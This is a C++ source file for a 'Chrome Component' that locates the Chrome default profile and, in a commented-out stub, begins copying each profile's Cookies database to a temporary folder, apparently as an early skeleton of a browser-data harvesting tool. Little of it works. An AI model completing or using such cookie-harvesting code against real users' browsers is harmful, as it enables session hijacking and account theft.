//
// Created by Bhasher on 01/05/2020.
//

#include <iostream>
#include <filesystem>
#include <random>
#include "chrome.h"
#include "../utils/db.h"

/**
 * @brief Execute the *Chrome Component* and extract everything he can from chrome's data.
 * @return if execution finish correctly.
 */
bool Chrome::execute() {
    return true;
}

/**
 * @brief Check if chrome default profile exist.
 * @details Check if google chrome default profile exist. If so, add it to the `profilesPath` vector.
 * @todo Exceptions are not yet handled.
 * @todo Profiles paths in others locations are not yet scrapped.
 * @return if Chrome can be scrapped.
 */
bool Chrome::can() {
    std::filesystem::path chromePath{std::getenv("LOCALAPPDATA")};
    chromePath /= "Google\\Chrome\\User Data\\Default";
    if(!std::filesystem::exists(chromePath)){
        return false;
    }
    Chrome::profilesPath.push_back(chromePath);
    return true;
}

/**
 * @brief Cellects cookies from chrome database for each profile.
 * @return an map with a vector of cookies linked to each profile.
 */
/*std::unordered_map<std::filesystem::path, std::vector<Cookie>> Chrome::getCookies() {
    std::unordered_map<std::filesystem::path, std::vector<Cookie>> cookies{};
    for(std::filesystem::path const &path : Chrome::profilesPath){
        std::vector<Cookie> profileCookies{};

        db::copyDB(path / "Cookies", std::filesystem::temp_directory_path() / "Cookies");
    }
}*/
